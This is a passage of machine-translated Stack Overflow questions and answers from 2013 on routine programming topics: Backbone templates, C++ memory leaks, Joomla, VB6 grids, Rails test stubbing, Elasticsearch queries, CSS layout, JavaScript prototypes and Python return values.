如果您打算用`b`它来做其他事情，那么您如何创建和/或使用它取决于该用途。您可以创建一个`format`，它是值的映射 [即 1='Hello' 2='Goodbye'] ，因此允许您使用单个编程语句将一个值转换为另一个值。您可以将其加载到哈希表中。您可以将其转置为一行 ( `proc transpose`)。提供更多细节，可以提供更具体的答案。

# javascript - UnderscoreJS Uncaught TypeError：无法调用未定义的方法“替换”

> ID：15650544
> 
> 赞同：5
> 
> 时间：2013-03-27T01:37:50.247
> 
> 标签：javascript, backbone.js, underscore.js

在我的主干视图中，我有：

`noteTemplate: _.template($('#note-template').html()),`

这是抛出这个错误。模板是：

```
<script type="text/template" id="note-template">
    <div class="reminder">
        <div class="reminder-hover">
            <div class="title"><%= title %></div>
            <div class="created">Created 3 days ago <span class="pull-right"> In 3 hours</span></div>
        </div>
        <span class="id" style="display: none;"><%= id %></span>
    </div>
</script> 
```

我很困惑，因为这在我的控制台中有效：

`>> _.template($('#note-template').html());`
`function (n){return e.call(this,n,w)}`

这是完整的代码：

```
App.Views.Index = Backbone.View.extend({

    el: $("div.reminders"),
    todays : $("span.today"),
    tomorrows : $("span.tomorrow"),
    weeks : $("span.week"),
    all_times : $("span.all-time"),

    noteTemplate: _.template($('#note-template').html()),

    events: {
        "click .reminder" : "editNote",
        "click .newNote"  : "newNote"
    },

    initialize : function() { 
        _.bindAll(this, 'render');
        this.notes = this.options.notes;
        this.listenTo(this.model, 'change', this.render);
    },

    render : function() {
        // Hide things related to editing a note 
        this.$("[name=content]").hide().val("");
        this.$("[name=title]").hide().val("");
        this.$("save1").hide();
        this.$("close1").hide();

        // Fill in content
        this.$el.html( this.noteTemplate( this.model.toJSON() ) );
        this.$todays.html( collection.getTodays.length );
        this.$tomorrows.html( collection.getTomorrows.length );
        this.$weeks.html( collection.getWeeks.length );
        this.$all_times.html( collection.getAllTimes.length );
        return this;
    },

    editNote : function() {
        this.goTo("notes/"+this.model.id);
    },

    newNote : function(){
        this.goTo("newNote");
    }

}); 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-27T01:58:50.377

与其在定义方法时尝试缓存注释模板 HTML，不如在初始化视图时进行。

```
initialize : function() { 
    // ...
    this.nodeTemplate = _.template($('#note-template').html());
} 
```

您很可能在加载 DOM（以及模板）之前定义视图。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-05-10T18:23:58.973

另一种解决方案是移动调用视图上方的标记脚本，如下所示（我正在使用玉）

```
script#page-thumb(type='text/template')
    .page-thumb-container.relative
      .page-thumb
        .image
          figure
            img(src='{{ image }}' , width='80px',height='60px' , data-id='{{ id }}')
          span.title {{ title }}
      .page-dragger.absolute

script(src='js/src/views/PageThumbView.js') 
```

# actionscript - 2011 年三星 SmartTV 设备中的 YouTube 视频播放器渲染问题

> ID：15650549
> 
> 赞同：1
> 
> 时间：2013-03-27T01:38:21.320
> 
> 标签：actionscript, youtube-api

我和我的团队正在为三星联网电视和蓝光播放器设计一个基于视频的应用程序，我们想知道是否有人遇到过与 YouTube 播放器类似的图形渲染问题。也就是说，如果我们尝试在播放视频时在播放器窗口上显示一个指导性帮助弹出面板，则弹出窗口将随着视频在下方呈现而瓦解，从而产生丑陋的用户体验。同样，YouTube 视频播放器进度条有时不会完全呈现，而是显示为左侧的污点部分，然后在视频播放时部分呈现，并且标记沿着进度条向右移动。[请注意：这些问题不会在三星模拟器中发生，也不会在任何 2012 年三星设备中发生。它们只发生在 2011/2010 年的电视和蓝光播放器中。]

在设备本身及其运行时支持等方面，这是我们正在测试的内容：

三星智能电视和蓝光（2010 和 2011）：Flash8.0/ FlashLite3.1/ ActionScript2.0

三星智能电视和蓝光（2012 和 2013）：Flash 10.1 / ActionScript 3.0

非常感谢有关如何解决这些问题的任何见解或建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-30T07:08:05.910

我也看到过这个问题。这只是另一个错误，三星可能永远不会修复它，因为 AFAIK 他们只为当前 (2013) 和以前 (2012) 年的设备提供这种支持。

最后的希望可能是一种解决方法。尝试在受影响的区域上创建一个`MovieClip`填充的透明矩形并移动它以强制重绘。其他类似的技巧也可能有所帮助。

**PS：** Flash 似乎并不是最流行的构建应用程序的方式，这使得未来固件更新的机会更接近于 0。

# c++ - 这会产生内存泄漏吗？

> ID：15650550
> 
> 赞同：1
> 
> 时间：2013-03-27T01:38:26.343
> 
> 标签：c++, memory-leaks

我正在关注一本关于 C++ 编程的书，并且正在关注练习。一个练习要求我创建一个产生内存泄漏的程序。这个程序会产生这样的泄漏吗？

```
int main()
{
    int * pInt =  new int;
    *pInt = 20;

    pInt = new int;
    *pInt =50;

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-27T01:40:21.020

考虑到这是一个微不足道的例子，没有`delete`与你的配对`new`就是泄漏。为了防止在这种情况下发生泄漏，您需要以下内容：

```
int * pInt =  new int;
*pInt = 20;

delete pInt ;

pInt = new int;
*pInt =50;

delete pInt ; 
```

用于检测内存泄漏的一个不错的工具是[Valgrind](http://valgrind.org/)。我在您的示例代码上运行了该工具，如下所示：

```
 valgrind ./a.out 
```

这是它产生的输出的一部分：

```
==14153== HEAP SUMMARY:
==14153==     in use at exit: 8 bytes in 2 blocks
==14153==   total heap usage: 2 allocs, 0 frees, 8 bytes allocated
==14153== 
==14153== LEAK SUMMARY:
==14153==    definitely lost: 8 bytes in 2 blocks 
```

这证实了该程序确实泄漏了内存。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-27T01:40:51.160

是的。为避免泄漏，每次调用`new`时，都必须对`delete`. 您有 2 次呼叫`new`，没有呼叫`delete`，因此您有 2 次泄漏。

请注意，当您的程序退出时，操作系统将释放您分配的所有内存`new`。所以内存泄漏实际上只是非平凡程序的问题。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-27T01:39:58.477

是的，这产生的不是一个，而是两个内存泄漏：两个分配`int`的 s 都被泄漏。此外，第一个被不可恢复地泄露：一旦你分配`pInt`了`new int`第二次，第一个分配的项目就永远消失了。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-03-27T01:40:00.783

> 这个程序会产生吸漏吗？

是的，它会的。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-03-27T01:53:46.310

> ```
> One exercise asks me to create a program that produces a memory leak. 
> ```
> 
> 这个程序会产生这样的泄漏吗？
> 
> 一个彻底的练习，你的代码是练习的更好答案！

指针和内存泄漏。这些确实是开发人员大部分调试时间的项目

## *内存泄漏*

内存泄漏真的很烦人。下面的列表描述了一些导致内存泄漏的场景。

```
Reassignment,  I'll use an example to explain reassignment.

char *memoryArea = malloc(10);
char *newArea = malloc(10); 
```

这会将值分配给下面图 4 中所示的内存位置。

[http://www.ibm.com/developerworks/aix/library/au-toughgame/fig4.gif](http://www.ibm.com/developerworks/aix/library/au-toughgame/fig4.gif) 图 4\. 内存位置

memoryArea 和 newArea 分别分配了 10 个字节，它们各自的内容如图 4 所示。如果有人执行如下所示的语句（指针重新分配）

```
memoryArea = newArea; 
```

那么它肯定会带您进入该模块开发的后期阶段的艰难时期。

在上面的代码语句中，开发人员已将 memoryArea 指针分配给 newArea 指针。结果，memoryArea 之前指向的内存位置变成了孤儿，如下图 5 所示。它不能被释放，因为没有引用这个位置。这将导致 10 个字节的内存泄漏。

[http://www.ibm.com/developerworks/aix/library/au-toughgame/fig5.gif](http://www.ibm.com/developerworks/aix/library/au-toughgame/fig5.gif) 图 5\. 内存泄漏

```
Before assigning the pointers, make sure memory locations are not becoming orphaned.
Freeing the parent block first

Suppose there is a pointer memoryArea pointing to a memory location of 10 bytes. The third byte of this memory location further points to some other dynamically allocated memory location of 10 bytes, as shown in Figure 6. 
```

[http://www.ibm.com/developerworks/aix/library/au-toughgame/fig6.gif](http://www.ibm.com/developerworks/aix/library/au-toughgame/fig6.gif) 图 6\. 动态分配的内存

```
free(memoryArea) 
```

**如果通过调用 free 来释放 memoryArea，则结果 newArea 指针也将变为无效。无法释放 newArea 指向的内存位置，因为没有指针指向该位置。换句话说，newArea 指向的内存位置变成了孤儿并导致内存泄漏。

每当释放结构化元素时，它又包含指向动态分配的内存位置的指针，首先遍历子内存位置（示例中的 newArea）并从那里开始释放，然后遍历回父节点。这里正确的实现是：free(memoryArea->newArea); 空闲（内存区域）；返回值处理不当有时，某些函数会将引用返回到动态分配的内存。跟踪此内存位置并正确处理它成为调用函数的责任。**

```
char *func ( )
{
        return malloc(20); // make sure to memset this location to â€˜\0â€™â€¦
}

void callingFunc ( )
{
        func ( ); // Problem lies here
}

In the example above, the call to the func() function inside the callingFunc() function is not handling the return address of the memory location. As a result, the 20 byte block allocated by the func() function is lost and results in a memory leak. 
```

尖锐参考： [http ://www.ibm.com/developerworks/aix/library/au-toughgame/](http://www.ibm.com/developerworks/aix/library/au-toughgame/)

**更新：** 您的兴趣让我进行编辑

## **避免 C 中内存泄漏的简单规则**

您正在为 p 和 q 分配内存：

```
p=new int [5];
/* ... */
q=new int; 
```

但是您只是使用无效运算符释放 p，因为应该使用 delete[] 删除数组。您应该在某个时候释放 p 和 q 使用：

```
delete[] p;
delete q; 
```

请注意，由于您使指针指向另一个指针的分配缓冲区，因此您可能必须检查哪个删除运算符对应于哪个新操作。

您应该在使用 new[] 分配的缓冲区上使用 delete[]，并使用使用 new 分配的缓冲区进行删除。

> 规则 1：总是在“malloc”之后写“free”</p>

```
int *p = (int*) malloc ( sizeof(int) * n );

free (p); 
```

> 规则 2：永远不要使用分配的指针。使用副本！

```
int *p_allocated = (int*) malloc ( sizeof(int) * n );

int *p_copy = p_allocated;

// do your stuff with p_copy, not with p_allocated!

// e.g.:

while (n--) { *p_copy++ = n; }

...

free (p_allocated); 
```

> 规则3：不要吝啬。使用更多内存。

总是从分配比你需要的更多的内存开始。完成调试后，返回并减少内存使用。如果您需要一个 1000 个整数长的数组，请分配 2000，并且只有在确保其他一切都正常之后——然后再返回并将其减少到 1000。

> 规则 4：始终随身携带数组长度

无论你的数组去哪里，它的长度都应该有。一个不错的技巧是分配一个大小为 n+1 的数组，并将 n 保存到它的 0 位置：

```
int *p_allocated = (int*) malloc ( sizeof(int) * (n+1) );
int *p_copy = p_allocated+1;
p_copy[-1] = n;
// do your stuff with p_copy, not with p_allocated!
free (p_allocated); 
```

> 规则 5：保持一致。并保存评论

最重要的是要保持一致并写下你所做的事情。我总是惊讶于有多少程序员似乎认为评论是在浪费时间。它们是必不可少的。没有评论，你可能不会记得你做了什么。想象一下，在您编写代码一年后返回您的代码，并花费无数小时试图回忆该索引的作用。最好花几秒钟把它写下来。

此外，如果您始终如一，您将不会经常失败。始终使用相同的机制来传递数组和指针。不要轻易改变你做事的方式。如果您决定使用我以前的技巧，请在任何地方使用它，否则您可能会发现自己引用了一个不存在的地方，因为您忘记了选择的引用类型。

参考： http: [//mousomer.wordpress.com/2010/11/03/simple-rules-to-avoid-memory-leaks-in-c/](http://mousomer.wordpress.com/2010/11/03/simple-rules-to-avoid-memory-leaks-in-c/)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-03-27T01:40:56.003

是和不是。当 pInt 被一个新的 int 指针覆盖时，你会丢失之前分配的内存，但是当程序返回时，大多数现代操作系统会清理这个内存，以及由于没有在最后释放 pInt 而丢失的内存。

所以本质上，是的，这样的事情会导致两次内存泄漏。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-03-27T01:41:26.040

确实如此，因为您使用“new int”语句分配空间，但不要使用“delete”来释放空间。

# joomla - Mootools 和 Joomla 2.5 自定义模板

> ID：15650551
> 
> 赞同：2
> 
> 时间：2013-03-27T01:38:27.933
> 
> 标签：joomla, mootools, joomla2.5, joomla-template

我为 joomla 2.5 创建了一个自定义模板，我想知道为我的模板禁用 mootools 是否安全？

如果它是安全的，我该如何禁用 mootools？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-27T04:40:08.413

您可以在 Joomla!的[核心增强/性能](http://extensions.joomla.org/extensions/core-enhancements/performance/)部分找到几个[禁用 MooTools 的扩展！](http://extensions.joomla.org/extensions/core-enhancements/performance/mootools)扩展目录 ( [JED](http://extensions.joomla.org/) ) 正如已经提到的那样，这样做是安全的，因为 MooTools 只是Joomla真正*需要的！*2.5.x 后端即.*`/administrator`*

 *话虽如此，您应该知道 Joomla! 的某些方面！2.5 前端确实需要加载 MooTools 并且许多扩展“期望”它在那里（尽管它们不是特别好的）。

通常 Mootools 由 PHP 调用`JHTML::_('behavior.mootools');`或`JHTML::_('behavior.framework')`

在前端加载 MooTools 的核心元素包括：

1.  联系人 ( `com_contact`)
2.  内容（`com_content`在博客中，类别视图）
3.  高级搜索 ( `com_finder`)
4.  新闻提要 ( `com_newsfeeds`)
5.  网页链接 ( `com_weblinks`)

在前端使用它的流行第三方组件包括：
1\. [RokGallery](http://extensions.joomla.org/extensions/photos-a-images/galleries/photo-gallery/19642) - 事实上[他们的很多东西](http://extensions.joomla.org/extensions/owner/rhuk)在 RokSprocket
2\. [Akeeba Subscriptions](http://extensions.joomla.org/extensions/e-commerce/membership-a-subscriptions/19528)
3\. [Akeeba Release System](http://extensions.joomla.org/extensions/directory-a-documentation/downloads/16825)
4\. 和许多其他...

要记住的是，MooTools 已经在“核心”中*存在很长时间了*，开发人员希望它存在，无论是否正确，因此，您必须检查任何扩展并查看是否有任何核心组件在您这样做时受到不利影响去掉它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-27T09:29:23.340

要添加到 cppl 答案：

据我所知，Joomla 中的每个库都/应该仅在需要时加载。如果 MooTools 加载到您的站点上，则某些扩展/核心功能正在使用它，因此如果您只是将其删除，某些事情可能会中断。

你可以做什么：

1.  检查使用 MooTools 的代码
2.  如果它是内联代码，可能您可以使用[模板覆盖](http://docs.joomla.org/How_to_override_the_output_from_the_Joomla!_core)来覆盖它以使用 jQuery
3.  如果有库（如`validate.js`），您可以提供替代库（使用 jQuery），将它们放在`/templates/[your_template/js/system/`文件夹中。

删除 MooTools 并加载 jQuery 会更有意义。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-27T01:52:18.650

从执行此操作的扩展数量来看，我会说它不仅安全，而且通常是可取的。

[http://extensions.joomla.org/extensions/core-enhancements/performance/mootools](http://extensions.joomla.org/extensions/core-enhancements/performance/mootools)*

# vb6 - 在 vb6 flexgrid 中手动输入小计值

> ID：15650554
> 
> 赞同：1
> 
> 时间：2013-03-27T01:38:36.580
> 
> 标签：vb6

我有一个带有分组的 flexgrid，以及该分组的 .subtotal。除了一列之外的所有列都是数字的，不是数字的列的格式为“x/y”，例如“1/5”，即提供的 5 个项目中的 1 个。

如果我使用 flexSTSum 执行 .Subtotal ，它将对中的第一个数字求和，即在上面的示例中，它将 1 作为小数求和并在小计行中显示 1.00

起初我试图找到一种在另一列上求和的方法，即我可以将单个值放入单独的列中，给它们一个 .Width 0 并将它们相加到第一列的 .Subtotal 列中，但我找不到一种方法来做到这一点。

即使我确实找到了一种方法，我也希望能够自定义格式化 .Subtotal，因此它显示为“3/17”，即“1/5”和“2/12”小计到“3/” 17' 在小计行中。

如果我不能对另一列进行小计，我想知道是否可以自定义访问小计行并手动输入“3/17”的小计值，但即使这样似乎也不可用。

我的问题是，有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T06:52:28.657

我假设您使用的是我从未使用过的 VideoSoft FlexGrid，所以我无法帮助您了解该控件的具体方法。

不过，您可以使用标准的 MSFlexGrid 控件轻松完成此操作，并且您也可以使用 VideoSoft FlexGrid 进行相同操作。

查看以下示例项目：

```
'1 form with :
'    1 msflexgrid control : name=MSFlexGrid1
Option Explicit

Private Sub Form_Load()
  Dim lngRow As Long, lngCol As Long
  With MSFlexGrid1
    .Rows = 10
    .Cols = 4
    .FixedRows = 0
    .FixedCols = 0
    For lngRow = 0 To .Rows - 2
      For lngCol = 0 To .Cols - 2
        .TextMatrix(lngRow, lngCol) = CStr(100 * lngRow + lngCol)
      Next lngCol
      .TextMatrix(lngRow, .Cols - 1) = CStr(lngRow) & "/" & CStr(lngRow * lngRow)
    Next lngRow
  End With 'MSFlexGrid1
End Sub

Private Sub Form_Resize()
  MSFlexGrid1.Move 0, 0, ScaleWidth, ScaleHeight
End Sub

Private Sub MSFlexGrid1_Click()
  Dim lngCol As Long
  'calculate subtotals
  With MSFlexGrid1
    For lngCol = 0 To .Cols - 2
      .TextMatrix(.Rows - 1, lngCol) = CStr(GetTotal(lngCol))
    Next lngCol
    .TextMatrix(.Rows - 1, .Cols - 1) = GetTotalSpecial(.Cols - 1)
  End With 'MSFlexGrid1
End Sub

Private Function GetTotal(lngCol As Long) As Long
  Dim lngRow As Long
  Dim lngTotal As Long
  With MSFlexGrid1
    lngTotal = 0
    For lngRow = 0 To .Rows - 2
      lngTotal = lngTotal + Val(.TextMatrix(lngRow, lngCol))
    Next lngRow
  End With 'MSFlexGrid1
  GetTotal = lngTotal
End Function

Private Function GetTotalSpecial(lngCol As Long) As String
  Dim lngRow As Long
  Dim lngTotal1 As Long, lngTotal2 As Long
  Dim strPart() As String
  With MSFlexGrid1
    lngTotal1 = 0
    lngTotal2 = 0
    For lngRow = 0 To .Rows - 2
      strPart = Split(.TextMatrix(lngRow, .Cols - 1), "/")
      If UBound(strPart) = 1 Then
        lngTotal1 = lngTotal1 + Val(strPart(0))
        lngTotal2 = lngTotal2 + Val(strPart(1))
      End If
    Next lngRow
  End With 'MSFlexGrid1
  GetTotalSpecial = CStr(lngTotal1) & "/" & CStr(lngTotal2)
End Function 
```

它将加载带有一些值的网格，当您单击网格时，将计算小计并将其填充到最后一行。

# ruby-on-rails - 如何在模型中共同存根 after_create 回调？

> ID：15650567
> 
> 赞同：0
> 
> 时间：2013-03-27T01:40:31.213
> 
> 标签：ruby-on-rails, ruby-on-rails-3, stubbing

我正在使用 Rails 3.2.11、Mac OS X Mountain Lion、Rspec

这是我的问题：

我有一个模型，它在创建时会将信息发送到 api。它可以正常工作，但是当我在 rspec 中对其进行测试时，测试数据也会发送到 api 数据库。这是代码：

**模型**

```
after_create :send_to_api

def send_to_api
  api = APIModule.initialize_api(params)
  api.send_data(self.attribute1,self.attribute2)
  #connect to api, send to data to api
end 
```

我在测试中试过这个：

```
Model.any_instance.stub(:send_to_api).and_return(true) 
```

但它没有用。每次我在测试中创建所述模型时，它都会将它们发送到数据库。任何帮助，将不胜感激。提前非常感谢！

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-03-27T16:45:04.343

不知道你是否明白这一点，但如果你安装 mocha，你可以这样做：

```
Model.any_instance.stubs(:send_to_api).returns(true) 
```

刚刚测试过，它可以工作

# ms-access - 访问搜索表单 - 搜索分隔字符串

> ID：15650568
> 
> 赞同：0
> 
> 时间：2013-03-27T01:40:36.380
> 
> 标签：ms-access, search

我创建了一个简单的搜索表单，可以搜索单个 Box 参考号。输出是一个带有箱号的报告（或当搜索返回多个匹配项时的箱号列表）。例如搜索 ABC111，返回如下报告：

```
Box      Description
ABC1110  Stuff
ABC1114  More stuff
ABC1119  Even more stuff 
```

我在 Search_Query 中使用以下标准

```
Like "*" & [forms]![Search_form]![Boxref] & "*" 
```

但是我的客户想在 BOX Ref 字段中粘贴一个框列表，例如：ABC1110、ADF1234、AGT2112

...并让报告显示如下：

```
Box      Description
ABC1110  Stuff
ADF1234  Cool stuff
AGT2112  More cool stuff 
```

我需要编写什么标准命令来实现这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T04:44:09.310

在您的搜索条件中使用正则表达式，通过以下链接您会有所了解

[http://timothychenallen.blogspot.in/2006/05/ms-access-vba-regular-expressions-regex.html](http://timothychenallen.blogspot.in/2006/05/ms-access-vba-regular-expressions-regex.html)

[http://bricesacey.com/2010/07/09/Regular-Expressions-in-MS-Access.html](http://bricestacey.com/2010/07/09/Regular-Expressions-in-MS-Access.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T06:28:47.767

你可以这样使用

```
IN ("*ABC1110*","*ADF1234*","*AGT2112*") 
```

或者，如果您愿意，可以使用搜索表单的文本框

```
Criteria ="In ("
with [forms]![Search_form]
    Criteria = Criteria & "*" & ![Boxref1] & "*"
    Criteria = Criteria & ",*" & ![Boxref2] & "*"
    Criteria = Criteria & ",*" & ![Boxref3] & "*"
    ......
end with
Criteria = Criteria & ")" 
```

甚至写一个循环来做

# elasticsearch - 没有为 [匹配] 注册查询

> ID：15650574
> 
> 赞同：2
> 
> 时间：2013-03-27T01:40:51.923
> 
> 标签：elasticsearch

我正在研究 ElasticSearch Server 书中的一些示例，并尝试编写一个简单的匹配查询

```
{ 
  "query" : { 
    "match" : {
        "displayname" : "john smith"
    }
  }
} 
```

这给了我错误：

```
{\"error\":\"SearchPhaseExecutionException[Failed to execute phase [query],      
....
SearchParseException[[scripts][4]: from[-1],size[-1]: Parse Failure [Failed to parse source 
....
QueryParsingException[[kb.cgi] No query registered for [match]]; } 
```

我也试过

```
{ 
    "match" : {
    "displayname" : "john smith"
    }
} 
```

根据[http://www.elasticsearch.org/guide/reference/query-dsl/match-query/上的示例](http://www.elasticsearch.org/guide/reference/query-dsl/match-query/)

编辑：我认为我使用的远程服务器不是最新的 0.20.5 版本，因为使用“文本”而不​​是“匹配”似乎允许查询工作

我在这里看到了类似的问题：http: [//elasticsearch-users.115913.n3.nabble.com/Character-escaping-td4025802.html](http://elasticsearch-users.115913.n3.nabble.com/Character-escaping-td4025802.html)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-27T02:05:15.700

看来我正在使用的远程服务器不是最新的 0.20.5 版本的 ElasticSearch，因此不支持“匹配”查询 - 而是“文本”，它有效

在看到此处报告的类似问题后，我得出了这个结论：http: [//elasticsearch-users.115913.n3.nabble.com/Character-escaping-td4025802.html](http://elasticsearch-users.115913.n3.nabble.com/Character-escaping-td4025802.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T01:45:53.513

您的第一个查询看起来不错，但您在请求中使用的方式可能不正确。这是一个有效的完整示例：

```
curl -XDELETE localhost:9200/test-idx
curl -XPUT localhost:9200/test-idx -d '{
    "settings": {
        "index": {
            "number_of_shards": 1,
            "number_of_replicas": 0
        }
    },
    "mappings": {
        "doc": {
            "properties": {
                "name": {
                    "type": "string", "index": "analyzed"
                 }
            }
        }
    }
}
'
curl -XPUT localhost:9200/test-idx/doc/1 -d '{
    "name": "John Smith"
}'
curl -XPOST localhost:9200/test-idx/_refresh
echo
curl "localhost:9200/test-idx/_search?pretty=true" -d '{
    "query": {
        "match" : {
            "name" : "john smith"
        }
    }
}
'
echo 
```

# css - 基于关键变量的 CSS 调整大小

> ID：15650588
> 
> 赞同：2
> 
> 时间：2013-03-27T01:42:58.940
> 
> 标签：css, responsive-design

我构建了一个动态大小的网格布局，可以合理地适应任何大小的分辨率（手机、平板电脑、台式机）并处理大小调整，同时接近像素完美（对不起，我是强迫症——我说“接近“因为我的数学现在被打破了，你不能在一个奇数大小的容器内放置两个大小均匀的元素，而不会在一侧有 1px 的填充）。

无论如何，下面是我用 JavaScript 破解的链接。这是我试图实现的一个例子。稍微调整底部窗格的宽度，看看我要做什么。

[http://jsfiddle.net/langdonx/uFW2C/2/](http://jsfiddle.net/langdonx/uFW2C/2/)

它有一些丑陋的手动 JavaScript，后来被移植到 Angular，但仍然存在计算所有样式的丑陋 JavaScript。

**所以我的问题**......我可以用严格的 CSS 来解决这个问题吗？或者更多的 CSS 和更少的 JavaScript？我的意思是根据屏幕宽度动态调整大小的单元格？

以下是*业务*规则：

*   最大单元格宽度：320px
*   每行最少 # 个单元格：2
    *   *这对于 CSS 来说可能是不可能的，所以我可以在我的 Galaxy Nexus 上设置 Min Cell Width: 178 for Chrome（其肖像模式为 360px 宽）*
*   单元格边框：5px，轮廓为 2px
*   单元格之间的可见边距：3px（边距实际上是 5px，但会`outline`渗出）

在这个例子中，我每次都在 resize 时重绘单元格，但在我的 Angular 版本中，我相信只有样式会更新。也就是说，我可能会`table`在调整大小时重新绘制 a ，但我只需要根据文档宽度计算单元格宽度，而且......我不会对使用 a 感到兴奋`table`。=[

-结束疯狂的咆哮

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T06:16:41.167

**媒体查询**

[CSS 媒体查询](http://www.w3.org/TR/css3-mediaqueries/)可能会让您非常接近纯 CSS 的解决方案。

这里的关键概念是根据浏览器的宽度使用不同的布局网格来改变列数。

媒体查询是根据浏览器宽度更改布局的自然 CSS 方式。而且它们不需要 JavaScript。如果您使用一组媒体查询——每个查询都针对不同范围的浏览器宽度——来控制使用哪个布局网格，那么每个网格所要做的就是响应式——每列的百分比宽度，并让内容拉伸以填充列宽。

**响应式设计**

那么问题就变成了：是否可以单独使用 CSS 自动拉伸每条内容以填充列？这取决于内容的类型、拉伸时的预期行为以及图形设计是否有任何妥协的余地。

通常，响应式网站的图形设计必须根据响应式设计的局限性进行调整（图形设计师大致了解什么是可行的，什么是不可行的）。但是......任何不能自动完成的事情，都可以使用 JavaScript 完成。

尝试拉伸内容的相关搜索词：*响应式设计*、*自适应内容*、*[流体网格](http://www.alistapart.com/articles/responsive-web-design/)*

注意：在这种情况下，“列”可能只是表示用于每条内容的浮动容器的百分比宽度。它不一定是传统意义上的“物理”列。

# javascript - B 扩展 A，但 B.add 填充 A.prototype.property

> ID：15650592
> 
> 赞同：1
> 
> 时间：2013-03-27T01:43:15.733
> 
> 标签：javascript, javascript-objects

我有一个类和另一个类从第一个继承属性子级。

```
function A() {}
A.prototype.children = [];

function B() {}
B.prototype = new A();
B.prototype.addChild = function(Child) {
    this.children.push(Child);
};

var b = new B();
b.addChild(new Object()); 
```

奇怪的是，当转储`b`到控制台时，它没有项目`.children`（如果属性`.children`存在；Chrome/Firefox），但它的原型的`.children`属性被填充。**这是为什么？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:49:14.000

您不应该使用原型来存储实例的数据。当您执行 this.children 时，B 中没有孩子，因此原型链继续到 A。正如@Bergi 所建议的，您应该删除：

```
B.prototype = new A 
```

尝试定义：

```
function A() {
  this.children = [];
}
A.prototype.addChild = function (o) { this.children.push(o)};
var b = new A();
b.addChild({}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T01:54:02.763

您的脚本中只创建了*一个*子数组，但由于继承，它被每个实例（甚至 B 的原型）引用。当你推动它时，你也会从任何地方看到变化。

相反，给每个实例自己的数组：

```
function A() {
    this.children = [];
} 
```

而且，不要只为[所有 B 实例创建一个数组来继承`new A`](https://stackoverflow.com/q/12592913/1048572)- 相反，使用

```
function B() {
    A.call(this); // do everything the A constructor does on this instance
}
B.prototype = Object.create(A.prototype);
B.prototype.addChild = function(Child) {
    this.children.push(Child);
}; 
```

# ruby-on-rails - 验证前删除所有 html 标签

> ID：15650609
> 
> 赞同：0
> 
> 时间：2013-03-27T01:45:01.020
> 
> 标签：ruby-on-rails, validation, html-sanitizing

是否有一种干净的方法可以在验证之前删除所有属性的所有 html 标记我发现acts_as_sanitized 似乎很完美，但是对于 rails 2 :-s

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-28T05:18:33.187

消毒宝石：

[https://github.com/rgrove/sanitize](https://github.com/rgrove/sanitize)

做你需要的。

调用 Sanitize.clean(htmlstring)。您也可以将允许的标签列入白名单。

# python - 有没有办法在 python 中不返回任何内容？

> ID：15650614
> 
> 赞同：43
> 
> 时间：2013-03-27T01:45:25.357
> 
> 标签：python

我正在学习 python，我只是想知道是否有一种方法可以编写如下代码：

```
def f(x):
    if x>1:
       return(x)
    else:
        # don't return anything 
```

我在问代码的 else 部分。我不需要返回任何东西`x<=1`，如果返回`None`是不可接受的。

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2013-03-27T01:49:53.200

在 Python 中没有“不返回任何内容”这样的东西。每个函数都会返回一些值（除非它引发异常）。如果没有`return`使用显式语句，Python 将其视为返回`None`。

因此，您需要考虑什么最适合您的功能。您应该返回`None`（或其他一些标记值）并向调用代码添加适当的逻辑以检测这一点，或者您应该引发异常（调用代码可以捕获，如果它愿意）。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-03-27T01:49:41.213

从字面上返回“无”使用`pass`，如果放入函数中，它基本上返回值 None （函数必须返回一个值，所以为什么不“无”）。不过，您可以明确地执行此操作`return None`。

所以要么：

```
if x>1:
    return(x)
else:
    pass 
```

或者

```
if x>1:
    return(x)
else:
    return None 
```

会成功的。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2019-08-24T12:11:51.013

没有什么比不返回任何内容更好的了，但是您尝试做的事情可以通过使用空`return`语句来完成。它返回一个`None`.

您可以在下面看到一个示例：

```
if 'account' in command:
    account()

def account():
    talkToMe('We need to verify your identity for this. Please cooperate.')
    talkToMe('May I know your account number please?')
    acc_number = myCommand()
    talkToMe('you said your account number is '+acc_number+'. Is it right?')
    confirmation = myCommand()
    if confirmation!='yes' or 'correct' or 'yeah':
        talkToMe('Let\'s try again!')
        account()
    else:
        talkToMe('please wait!')
    return 
```

这不会向调用函数返回任何内容，但会停止执行并到达调用函数。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2017-11-30T22:42:38.487

这个怎么样？

```
def function(x):
     try:
         x = x+1
         return (x)
     except:
         return ('') 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-03-27T02:31:47.537

你可以这样做：

```
>>> def f(x):
...    return x if x>1 else None
... 
>>> f(1),f(2)
(None, 2) 
```

它似乎“什么都不返回”：

```
>>> f(1)
>>> 
```

但即使是替代方案也返回 None：

```
>>> def f2(x): 
...    if x>1: return x
... 
>>> f2(1),f2(2)
(None, 2) 
```

或者：

```
>>> def f2(x):
...    if x>1: 
...        return x
...    else:
